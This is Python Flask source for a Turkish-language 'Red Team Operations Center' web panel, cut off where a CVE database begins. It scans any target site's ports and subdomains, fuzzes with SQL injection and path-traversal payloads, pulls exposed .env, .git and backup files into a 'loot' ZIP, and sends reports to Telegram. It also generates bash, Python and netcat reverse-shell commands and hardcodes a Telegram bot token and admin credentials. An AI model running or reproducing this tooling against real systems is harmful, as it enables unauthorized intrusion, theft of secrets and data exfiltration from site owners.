import os
import time
import socket
import ssl
import urllib.parse
import requests
import threading
import subprocess
import re
import csv
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
from datetime import datetime
from fpdf import FPDF
import io

# --- ÇEVRE DEĞİŞKENLERİ VE GİRİŞ BİLGİLERİ ---
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9082287913:AAEw9lMwKXfRTGf4LzQiF1UEgLZDHzNuc8o")
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_USER = "root1"
ADMIN_PASS = "toor1"

SITE_DATABASE = []
NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

app = Flask(__name__)
app.secret_key = "red_team_secret_key_998877"

# --- GİRİŞ EKRANI HTML ŞABLONU ---
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Login - Red Team Operations Center</title>
    <style>
        body { background-color: #0b0f19; color: #f8fafc; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #1e293b; padding: 40px; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.8); width: 350px; text-align: center; }
        h2 { color: #38bdf8; margin-bottom: 25px; }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
        input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 15px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0284c7; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        button:hover { background: #0369a1; }
        .error { color: #f87171; margin-bottom: 15px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🔒 Red Team Login</h2>
        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST">
            <div class="input-group">
                <label>Kullanıcı Adı (Username)</label>
                <input type="text" name="username" required autofocus>
            </div>
            <div class="input-group">
                <label>Şifre (Password)</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Sisteme Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

# --- ANA KONTROL PANELİ HTML ŞABLONU (Dosya Analiz Sekmesi Eklendi) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Enterprise Red Team Operations Center</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        body { background-color: #0b0f19; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }
        .container { max-width: 1250px; margin: 0 auto; background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.6); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-bottom: 2px solid #334155; padding-bottom: 15px; }
        h1 { color: #38bdf8; margin: 0; }
        .logout-btn { background: #dc2626; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-size: 14px; font-weight: bold; }
        .logout-btn:hover { background: #b91c1c; }
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        .tab-btn { background: #334155; color: #cbd5e1; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        .tab-btn.active { background: #0284c7; color: white; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .form-group { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
        input[type="text"], select, textarea, input[type="file"] { padding: 14px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 15px; }
        textarea { resize: vertical; height: 110px; font-family: monospace; }
        button { padding: 14px 24px; background: #0284c7; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; transition: 0.2s; font-weight: bold; }
        button:hover { background: #0369a1; }
        button.secondary { background: #0d9488; }
        button.success { background: #16a34a; }
        button.danger { background: #dc2626; }
        .preset-container { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 15px; }
        .preset-btn { background: #334155; color: #38bdf8; border: 1px solid #475569; padding: 8px 12px; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: bold; }
        .preset-btn:hover { background: #475569; color: #fff; }
        .actions { display: flex; gap: 10px; margin-top: 15px; display: none; }
        .terminal { background: #000; color: #34d399; padding: 20px; border-radius: 8px; border: 1px solid #334155; white-space: pre-wrap; font-family: 'Courier New', Courier, monospace; margin-top: 20px; max-height: 500px; overflow-y: auto; font-size: 13px; line-height: 1.5; }
        .loading { color: #facc15; font-style: italic; font-weight: bold; font-size: 15px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #0f172a; border-radius: 8px; overflow: hidden; }
        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #334155; font-size: 14px; }
        th { background: #0284c7; color: white; }
        tr:hover { background: #1e293b; }
        a.file-link { color: #38bdf8; text-decoration: underline; font-weight: bold; }
        .thumb { width: 100px; height: 60px; object-fit: cover; border-radius: 4px; border: 1px solid #475569; }
        .payload-box { background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 15px; }
        .dashboard-row { display: flex; gap: 20px; margin-bottom: 25px; flex-wrap: wrap; }
        .dashboard-card { flex: 1; background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #334155; text-align: center; min-width: 250px; }
        .export-bar { display: flex; gap: 10px; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-bar">
            <h1>🏴‍☠️ Enterprise Red Team Operations Center</h1>
            <a href="/logout" class="logout-btn">Çıkış Yap (Logout)</a>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Canlı Keşif & API</button>
            <button class="tab-btn" onclick="switchTab('lootingTab')" id="lootingTabBtn">🏴‍☠️ Looting & Veri Çek</button>
            <button class="tab-btn" onclick="switchTab('analysisTab')">🔍 Dosya Analiz & Secret Scanner</button>
            <button class="tab-btn" onclick="switchTab('payloadTab')">🛠️ Payload Üretici</button>
            <button class="tab-btn" onclick="switchTab('dataTab')" id="dataTabBtn">📁 Site Verileri & Grafik</button>
        </div>

        <!-- Canlı Tarama Sekmesi -->
        <div id="scanTab" class="tab-content active">
            <div class="form-group">
                <label><b>Hedef Site:</b></label>
                <input type="text" id="targetUrl" placeholder="Hedef siteyi gir (örn: example.com)">
            </div>
            
            <div class="form-group">
                <label><b>💡 Hazır Kelime Listesi / Looting Havuzu:</b></label>
                <div class="preset-container">
                    <button class="preset-btn" onclick="loadPreset('config')">📂 Kritik Config & Backup</button>
                    <button class="preset-btn" onclick="loadPreset('git')">🏴‍☠️ .git Kaynak Kod Yolları</button>
                    <button class="preset-btn" onclick="loadPreset('sqli')">⚡ SQL Injection Payloadları</button>
                    <button class="preset-btn" onclick="loadPreset('lfi')">📁 LFI / Path Traversal</button>
                    <button class="preset-btn" onclick="clearWordlist()">🧹 Temizle</button>
                </div>
                <textarea id="customWordlist" placeholder="Hazır listeleri yukarıdan seçebilir veya buraya kendi yollarınızı yazabilirsiniz..."></textarea>
            </div>

            <button onclick="startScan(false)">API Fuzzing & Looting Taramasını Başlat</button>
            
            <div id="status" class="loading" style="margin-top: 15px;"></div>
            
            <div class="actions" id="actionButtons">
                <button class="secondary" onclick="downloadReport('txt')">📥 Rapor TXT İndir</button>
                <button class="danger" onclick="downloadReport('pdf')">📄 Profesyonel PDF İndir</button>
                <button class="success" onclick="sendToTelegram()">📤 Telegram'a Gönder</button>
            </div>

            <div id="results" class="terminal" style="display:none;"></div>
        </div>

        <!-- Looting & Veri Çekme Sekmesi -->
        <div id="lootingTab" class="tab-content">
            <h3>🏴‍☠️ Otomatik Veri Yağmalama (Data Exfiltration & ZIP İndir)</h3>
            <p style="color: #94a3b8; font-size: 13px;">Taraması yapılmış ve hassas dosyaları yakalanmış hedeflerin verilerini tek tıkla ZIP olarak bilgisayarına indir.</p>
            
            <div class="form-group">
                <label><b>Arşivdeki Hedef Siteyi Seç:</b></label>
                <select id="lootingTargetSelect">
                    <option value="">Önce bir tarama yapın veya arşivden seçin...</option>
                </select>
            </div>
            
            <button class="success" onclick="downloadLootZip()" style="font-size: 16px;">📦 Seçilen Hedefin Tüm Verilerini ZIP Olarak İndir</button>
        </div>

        <!-- Dosya Analiz & Secret Scanner Sekmesi -->
        <div id="analysisTab" class="tab-content">
            <h3>🔍 Dosya Analiz & Secret Scanner (Hassas Veri Avı)</h3>
            <p style="color: #94a3b8; font-size: 13px;">İndirdiğin .env, config.json, log veya metin dosyalarını yükle; sistem içindeki gizli şifreleri, API anahtarlarını ve veritabanı yollarını tarayıp raporlasın.</p>
            
            <div class="form-group">
                <label><b>Analiz Edilecek Dosyayı Seç (.env, .json, .txt, .sql, .log vb.):</b></label>
                <input type="file" id="analysisFile">
            </div>
            
            <button class="secondary" onclick="uploadAndAnalyzeFile()">🚀 Dosyayı Analiz Et & Secret Tara</button>
            
            <div id="analysisStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="analysisResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- Payload & Shell Üreticisi Sekmesi -->
        <div id="payloadTab" class="tab-content">
            <h3>🛠️ Red Team Payload & Reverse Shell Generator</h3>
            <p style="color: #94a3b8; font-size: 13px;">IP adresinizi ve portunuzu girerek anında hazır shell komutları oluşturun.</p>
            
            <div class="form-group" style="display: flex; flex-direction: row; gap: 15px; flex-wrap: wrap;">
                <input type="text" id="attackerIp" placeholder="LHOST (IP Adresiniz)" style="flex: 1; min-width: 200px;">
                <input type="text" id="attackerPort" placeholder="LPORT (Port, örn: 4444)" style="flex: 1; min-width: 200px;">
                <button onclick="generatePayloads()" style="padding: 14px 20px;">Üret</button>
            </div>

            <div id="payloadResults">
                <div class="payload-box">
                    <b>Bash Reverse Shell:</b><br>
                    <code id="bashPayload" style="color: #34d399;">bash -i >& /dev/tcp/IP/PORT 0>&1</code>
                </div>
                <div class="payload-box">
                    <b>Python Reverse Shell:</b><br>
                    <code id="pythonPayload" style="color: #34d399;">python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"])'</code>
                </div>
                <div class="payload-box">
                    <b>Netcat (nc) Shell:</b><br>
                    <code id="ncPayload" style="color: #34d399;">nc -e /bin/sh IP PORT</code>
                </div>
            </div>
        </div>

        <!-- Site Verileri ve Grafik Dashboard Sekmesi -->
        <div id="dataTab" class="tab-content">
            <div class="export-bar">
                <a href="/api/export/json" target="_blank"><button class="secondary" style="padding: 10px 16px; font-size: 14px;">📥 JSON Olarak Dışa Aktar</button></a>
                <a href="/api/export/csv" target="_blank"><button class="success" style="padding: 10px 16px; font-size: 14px;">📥 CSV Olarak Dışa Aktar</button></a>
            </div>

            <h3>📈 İstatistik & Risk Grafikleri (Chart.js Dashboard)</h3>
            <div class="dashboard-row">
                <div class="dashboard-card">
                    <h4>Güvenlik Notu Dağılımı (Grading)</h4>
                    <canvas id="gradeChart" style="max-height: 180px;"></canvas>
                </div>
                <div class="dashboard-card">
                    <h4>WAF Koruma Dağılımı</h4>
                    <canvas id="wafChart" style="max-height: 180px;"></canvas>
                </div>
            </div>

            <h3>📁 Arşivlenen Hedefler ve Hızlı İşlemler</h3>
            <div id="databaseTableContainer">
                <p style="color: #94a3b8;">Henüz kaydedilmiş site verisi yok.</p>
            </div>
        </div>
    </div>

    <script>
        let currentReportText = "";
        let lastTarget = "";
        let gradeChartInstance = null;
        let wafChartInstance = null;

        const presets = {
            config: "/.env\\n/config.json\\n/config.php\\n/database.sql\\n/backup.sql\\n/db.bak\\n/composer.json\\n/package.json\\n/web.config",
            git: "/.git/HEAD\\n/.git/config\\n/.gitignore\\n/.git/index",
            sqli: "/?id=1'\\n/?id=1 UNION SELECT null,null--\\n/?search=test' OR '1'='1\\n/api/v1/users?id=1'",
            lfi: "/?page=../../../../etc/passwd\\n/?file=../../../../etc/hosts\\n/index.php?doc=../../win.ini"
        };

        function loadPreset(type) {
            document.getElementById('customWordlist').value = presets[type].replace(/\\n/g, '\\n');
        }

        function clearWordlist() {
            document.getElementById('customWordlist').value = "";
        }

        function generatePayloads() {
            const ip = document.getElementById('attackerIp').value.trim() || '10.0.0.1';
            const port = document.getElementById('attackerPort').value.trim() || '4444';
            
            document.getElementById('bashPayload').innerText = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
            document.getElementById('pythonPayload').innerText = `python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${ip}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"])'`;
            document.getElementById('ncPayload').innerText = `nc -e /bin/sh ${ip} ${port}`;
        }

        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
            if(tabId === 'dataTab' || tabId === 'lootingTab') { loadSiteDatabase(); }
        }

        async function startScan(targetOverride = false) {
            let url = targetOverride ? targetOverride : document.getElementById('targetUrl').value.trim();
            const wordlist = document.getElementById('customWordlist').value.trim();
            const statusDiv = document.getElementById('status');
            const resultsDiv = document.getElementById('results');
            const actionButtons = document.getElementById('actionButtons');
            
            if(!url) { alert('Lütfen geçerli bir hedef gir!'); return; }
            if(targetOverride) {
                document.getElementById('targetUrl').value = url;
                switchTab('scanTab');
                document.querySelectorAll('.tab-btn')[0].classList.add('active');
            }

            lastTarget = url;
            
            statusDiv.innerHTML = `root@red-team-box:~# scanning target ${url} (API fuzzing, CVE & looting)...`;
            resultsDiv.style.display = "none";
            actionButtons.style.display = "none";
            resultsDiv.innerHTML = "";
            
            try {
                const response = await fetch('/api/scan', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target: url, wordlist: wordlist })
                });
                const data = await response.json();
                statusDiv.innerHTML = "";
                resultsDiv.style.display = "block";
                resultsDiv.innerHTML = data.report;
                currentReportText = data.report;
                actionButtons.style.display = "flex";
            } catch (err) {
                statusDiv.innerHTML = "❌ [HATA] Web servis taraması yürütülemedi!";
            }
        }

        async function uploadAndAnalyzeFile() {
            const fileInput = document.getElementById('analysisFile');
            const statusDiv = document.getElementById('analysisStatus');
            const resultsDiv = document.getElementById('analysisResults');

            if(fileInput.files.length === 0) { alert('Lütfen analiz edilecek bir dosya seçin!'); return; }
            
            const formData = new FormData();
            formData.append('file', fileInput.files[0]);

            statusDiv.innerHTML = "root@red-team-box:~# parsing file contents & scanning for secrets/credentials...";
            resultsDiv.style.display = "none";
            resultsDiv.innerHTML = "";

            try {
                const response = await fetch('/api/analyze-file', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                statusDiv.innerHTML = "";
                resultsDiv.style.display = "block";
                resultsDiv.innerHTML = data.report;
            } catch (err) {
                statusDiv.innerHTML = "❌ [HATA] Dosya analiz sunucusuna iletilemedi!";
            }
        }

        async function loadSiteDatabase() {
            const res = await fetch('/api/all-data');
            const data = await res.json();
            const container = document.getElementById('databaseTableContainer');
            const selectDropdown = document.getElementById('lootingTargetSelect');
            
            if(data.database.length === 0) {
                container.innerHTML = "<p style='color: #94a3b8;'>Veritabanında kayıtlı veri bulunmuyor.</p>";
                selectDropdown.innerHTML = '<option value="">Önce bir tarama yapın veya arşivden seçin...</option>';
                return;
            }

            let selectHtml = '<option value="">Hedef seçin...</option>';
            data.database.forEach(item => {
                selectHtml += `<option value="${item.target}">${item.target} (${item.files.length} Dosya)</option>`;
            });
            selectDropdown.innerHTML = selectHtml;

            let grades = {};
            let wafs = {};
            data.database.forEach(item => {
                let g = item.grade.charAt(0);
                grades[g] = (grades[g] || 0) + 1;
                let w = item.waf.includes("Cloudflare") ? "Cloudflare WAF" : "Diğer / Standart";
                wafs[w] = (wafs[w] || 0) + 1;
            });

            renderCharts(grades, wafs);

            let html = `<table>
                <thead>
                    <tr>
                        <th>Görsel Önizleme</th>
                        <th>Son Kontrol</th>
                        <th>Hedef Site</th>
                        <th>WAF</th>
                        <th>Not</th>
                        <th>Hızlı İşlemler</th>
                    </tr>
                </thead>
                <tbody>`;
            
            data.database.forEach(item => {
                let fileLinks = item.files.length > 0 ? item.files.map(f => `<a class="file-link" href="/api/view-file?url=${encodeURIComponent(f)}" target="_blank">${f}</a>`).join('<br>') : 'Yok';
                let thumbUrl = `https://image.thum.io/get/width/200/crop/150/${item.target}`;
                
                html += `<tr>
                    <td><img src="${thumbUrl}" class="thumb" alt="Preview" onerror="this.src='https://via.placeholder.com/100x60?text=No+Preview'"></td>
                    <td>${item.time}</td>
                    <td><b>${item.target}</b></td>
                    <td>${item.waf}</td>
                    <td>${item.grade}</td>
                    <td>
                        ${fileLinks}<br>
                        <button onclick="startScan('${item.target}')" style="padding: 6px 12px; font-size: 12px; margin-top: 6px; background: #0284c7;">⚡ Yeniden Tara</button>
                        <a href="/api/download-pdf?target=${encodeURIComponent(item.target)}" style="color: #f87171; font-weight: bold; text-decoration: underline; margin-left: 8px;" target="_blank">📥 PDF</a>
                    </td>
                </tr>`;
            });
            html += `</tbody></table>`;
            container.innerHTML = html;
        }

        function downloadLootZip() {
            const target = document.getElementById('lootingTargetSelect').value;
            if(!target) { alert('Lütfen listeden bir hedef seçin!'); return; }
            window.open(`/api/looting/zip?target=${encodeURIComponent(target)}`, '_blank');
        }

        function renderCharts(grades, wafs) {
            const ctxGrade = document.getElementById('gradeChart').getContext('2d');
            const ctxWaf = document.getElementById('wafChart').getContext('2d');

            if(gradeChartInstance) gradeChartInstance.destroy();
            if(wafChartInstance) wafChartInstance.destroy();

            gradeChartInstance = new Chart(ctxGrade, {
                type: 'bar',
                data: {
                    labels: Object.keys(grades),
                    datasets: [{
                        label: 'Güvenlik Notu',
                        data: Object.values(grades),
                        backgroundColor: ['#16a34a', '#38bdf8', '#facc15', '#dc2626']
                    }]
                },
                options: { responsive: true, plugins: { legend: { display: false } } }
            });

            wafChartInstance = new Chart(ctxWaf, {
                type: 'doughnut',
                data: {
                    labels: Object.keys(wafs),
                    datasets: [{
                        data: Object.values(wafs),
                        backgroundColor: ['#0284c7', '#0d9488', '#475569']
                    }]
                },
                options: { responsive: true }
            });
        }

        function downloadReport(type) {
            if(type === 'txt') {
                const blob = new Blob([currentReportText], { type: 'text/plain' });
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'red_team_report.txt';
                a.click();
            } else if(type === 'pdf') {
                if(!lastTarget) { alert('Önce bir tarama yapmalısın!'); return; }
                window.open(`/api/download-pdf?target=${encodeURIComponent(lastTarget)}`, '_blank');
            }
        }

        async function sendToTelegram() {
            const chatId = prompt("Telegram Chat ID giriniz:");
            if(!chatId) return;
            
            const res = await fetch('/api/telegram-send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, report: currentReportText })
            });
            const data = await res.json();
            alert(data.status);
        }
    </script>
</body>
</html>
"""

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username == ADMIN_USER and password == ADMIN_PASS:
            session["logged_in"] = True
            return redirect(url_for("index"))
        else:
            error = "Hatalı kullanıcı adı veya şifre!"
    return render_template_string(LOGIN_TEMPLATE, error=error)

@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("login"))

@app.route("/")
def index():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    return render_template_string(HTML_TEMPLATE)

@app.route("/api/scan", methods=["POST"])
def api_scan():
    if not session.get("logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    target = data.get("target", "")
    custom_wordlist = data.get("wordlist", "")
    
    custom_paths = [p.strip() for p in custom_wordlist.splitlines() if p.strip()]
    report, record = red_team_comprehensive_recon(target, custom_paths)
    
    existing = next((item for item in SITE_DATABASE if item["target"] == record["target"]), None)
    if existing: SITE_DATABASE.remove(existing)
    SITE_DATABASE.insert(0, record)
    if len(SITE_DATABASE) > 20: SITE_DATABASE.pop()
    
    return jsonify({"report": report})

@app.route("/api/analyze-file", methods=["POST"])
def api_analyze_file():
    if not session.get("logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    if 'file' not in request.files:
        return jsonify({"report": "❌ Dosya seçilmedi!"})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"report": "❌ Geçersiz dosya adı!"})
    
    try:
        content = file.read().decode('utf-8', errors='ignore')
    except Exception as e:
        return jsonify({"report": f"❌ Dosya okunamadı: {str(e)}"})
    
    # Secret Scanner Mantığı
    report = f"root@red-team-box:~# secret-scanner --file {file.filename}\n"
    report +="=" * 65 + "\n\n"
    
    findings = []
    
    # Şifreler ve API anahtarları için regex taraması
    secret_patterns = [
        (r'(?i)(api[_-]?key|secret[_-]?key|password|passwd|pwd|token|auth[_-]?token)\s*[:=]\s*["\']?([a-zA-Z0-9_\-\.]{6,})["\']?', "Hassas Anahtar / Şifre Eşleşmesi"),
        (r'(mysql|postgres|mongodb|redis|sqlite)://[^\s]+', "Veritabanı Bağlantı URL'si (URI)"),
        (r'-----BEGIN [A-Z]+ PRIVATE KEY-----', "Özel Şifreleme Anahtarı (Private Key)"),
        (r'(A3T[A-Z0-9][A-Z0-9|toor|root]{16,})', "Olası AWS Access Key ID")
    ]
    
    for pattern, desc in secret_patterns:
        matches = re.findall(pattern, content)
        if matches:
            for m in matches:
                matched_val = m[1] if isinstance(m, tuple) else m
                findings.append(f"🚨 [{desc}]: {matched_val}")
                
    if findings:
        report += f"[+] Toplam {len(findings)} potansiyel hassas veri tespit edildi:\n"
        for f in findings:
            report += f"  {f}\n"
    else:
        report += "✅ Dosya içerisinde bariz bir API anahtarı veya şifre regex imzasına rastlanmadı.\n"
        
    report += "\n--- Dosya İçerik Önizlemesi (İlk 500 Karakter) ---\n"
    report += content[:500] + ("...\n[Kısaltıldı]" if len(content) > 500 else "")
    report += "\n\n" + "=" * 65 + "\nroot@red-team-box:~# Secret Analysis Completed."
    
    return jsonify({"report": report})

@app.route("/api/all-data")
def api_all_data():
    if not session.get("logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"database": SITE_DATABASE})

@app.route("/api/export/json")
def export_json():
    if not session.get("logged_in"): return "Unauthorized", 401
    return jsonify(SITE_DATABASE)

@app.route("/api/export/csv")
def export_csv():
    if not session.get("logged_in"): return "Unauthorized", 401
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Time", "Target", "WAF", "Grade", "FilesCount"])
    for item in SITE_DATABASE:
        writer.writerow([item['time'], item['target'], item['waf'], item['grade'], len(item['files'])])
    return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=red_team_archive.csv"})

@app.route("/api/looting/zip")
def api_looting_zip():
    if not session.get("logged_in"): return "Unauthorized", 401
    target = request.args.get("target", "")
    record = next((item for item in SITE_DATABASE if item["target"] == target), None)
    
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        if record:
            zf.writestr("recon_report.txt", record["full_report"])
            for f_url in record["files"]:
                if f_url.startswith("http"):
                    try:
                        r = requests.get(f_url, timeout=4, verify=False)
                        if r.status_code == 200:
                            file_name = f_url.split("/")[-1] or "index.html"
                            zf.writestr(f"harvested_files/{file_name}", r.text)
                    except: pass
        else:
            zf.writestr("info.txt", f"No record found for target: {target}")
            
    memory_file.seek(0)
    safe_name = urllib.parse.urlparse(target).netloc or target
    return send_file(
        memory_file,
        mimetype='application/zip',
        as_attachment=True,
        download_name=f'loot_{safe_name}.zip'
    )

@app.route("/api/view-file")
def api_view_file():
    if not session.get("logged_in"):
        return "Unauthorized", 401
    file_url = request.args.get("url", "")
    try:
        r = requests.get(file_url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        return Response(r.text, mimetype="text/plain")
    except Exception as e:
        return f"Dosya içeriği okunamadı: {str(e)}", 500

@app.route("/api/download-pdf")
def api_download_pdf():
    if not session.get("logged_in"):
        return "Unauthorized", 401
    target = request.args.get("target", "")
    record = next((item for item in SITE_DATABASE if item["target"] == target), None)
    report_content = record["full_report"] if record else f"Red Team Report for {target}"
    
    class PDF(FPDF):
        def header(self):
            self.set_font('Arial', 'B', 12)
            self.set_text_color(2, 132, 199)
            self.cell(0, 10, 'Enterprise Red Team - Security Report', 0, 1, 'C')
            self.ln(5)
        def footer(self):
            self.set_y(-15)
            self.set_font('Arial', 'I', 8)
            self.set_text_color(150, 150, 150)
            self.cell(0, 10, 'Generated by Red Team Operations Center', 0, 0, 'C')

    pdf = PDF()
    pdf.add_page()
    pdf.set_font('Courier', '', 9)
    pdf.set_text_color(30, 41, 59)
    safe_text = report_content.encode('latin-1', 'replace').decode('latin-1')
    pdf.multi_cell(0, 5, safe_text)
    
    pdf_output = pdf.output(dest='S').encode('latin-1')
    return send_file(
        io.BytesIO(pdf_output),
        mimetype='application/pdf',
        as_attachment=True,
        download_name=f'enterprise_report_{urllib.parse.urlparse(target).netloc or target}.pdf'
    )

@app.route("/api/telegram-send", methods=["POST"])
def api_telegram_send():
    if not session.get("logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    chat_id = data.get("chat_id")
    report = data.get("report")
    if len(report) > 4000: report = report[:4000] + "\n...(Kısaltıldı)"
    
    url = f"{BASE_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": f"```\n{report}\n```", "parse_mode": "Markdown"}
    res = requests.post(url, json=payload, timeout=10)
    return jsonify({"status": "✅ Rapor Telegram'a gönderildi!" if res.status_code == 200 else "❌ Gönderim başarısız."})

def background_monitor_loop():
    while True:
        time.sleep(3600)
        for item in SITE_DATABASE:
            try:
                target = item["target"]
                _, new_record = red_team_comprehensive_recon(target, [])
                old_files = set(item["files"])
                new_files = set(new_record["files"])
                diff = new_files - old_files
                if diff and NOTIFY_CHAT_ID:
                    alert_msg = f"🚨 *OTOMATİK ALARM: Yeni Açık/Dosya Bulundu!*\nHedef: `{target}`\nYeni Dosyalar:\n" + "\n".join(diff)
                    requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": alert_msg, "parse_mode": "Markdown"}, timeout=10)
                item["files"] = new_record["files"]
                item["time"] = new_record["time"]
            except: pass

def detect_waf(headers, cookies_str):
    header_str = str(headers).lower()
    if "cf-ray" in header_str or "cloudflare" in header_str: return "Cloudflare WAF 🛡️"
    elif "incap_ses" in cookies_str or "incapsula" in header_str: return "Incapsula WAF 🛡️"
    elif "akamai" in header_str: return "Akamai WAF 🛡️"
    elif "awsalb" in cookies_str: return "AWS WAF 🛡️"
    elif "server" in headers and "angie" in headers["server"].lower(): return "Angie Web Server"
    return "Standart Koruma"

def calculate_security_grading(headers, is_https):
    score = 100
    deductions = []
    if not is_https:
        score -= 30
        deductions.append("HTTPS aktif değil (-30)")
    for h in ["Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options"]:
        if h not in headers:
            score -= 15
            deductions.append(f"Eksik başlık: {h} (-15)")
    if score >= 90: grade = "A (Güvenli)"
    elif score >= 75: grade = "B (İyi)"
    elif score >= 60: grade = "C (Orta)"
    else: grade = "F (Riskli)"
    return grade, score, deductions

def run_linux_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
        return output.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Komut çalıştırılamadı: {str(e)}"

def check_single_port(domain, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        result = s.connect_ex((domain, port))
        s.close()
        if result == 0: return port
    except: pass
    return None

def multi_threaded_port_scan(domain):
    common_ports = [21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 8080, 8443, 8880]
    open_ports = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_single_port, domain, port): port for port in common_ports}
        for future in as_completed(futures):
            p = future.result()
            if p: open_ports.append(p)
    return sorted(open_ports)

def check_single_subdomain(sub, domain):
    sub_dom = f"{sub}.{domain}"
    try:
        ip = socket.gethostbyname(sub_dom)
        return (sub_dom, ip)
    except: return None

def multi_threaded_subdomain_scan(domain):
    subs = ["www", "api", "admin", "test", "dev", "panel", "login", "mail", "shop", "portal", "vpn", "cpanel"]
    found = []
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(check_single_subdomain, sub, domain): sub for sub in subs}
        for future in as_completed(futures):
            res = future.result()
            if res: found.append(res)
    return found

def banner_grabbing(domain, open_ports):
    banners = {}
    for port in open_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((domain, port))
            if port in [80, 443, 8080, 8443]:
                s.send(f"HEAD / HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode())
            data = s.recv(1024).decode('utf-8', errors='ignore')
            if data: banners[port] = data.split('\r\n')[0]
            s.close()
        except: pass
    return banners

CVE_DATABASE = {
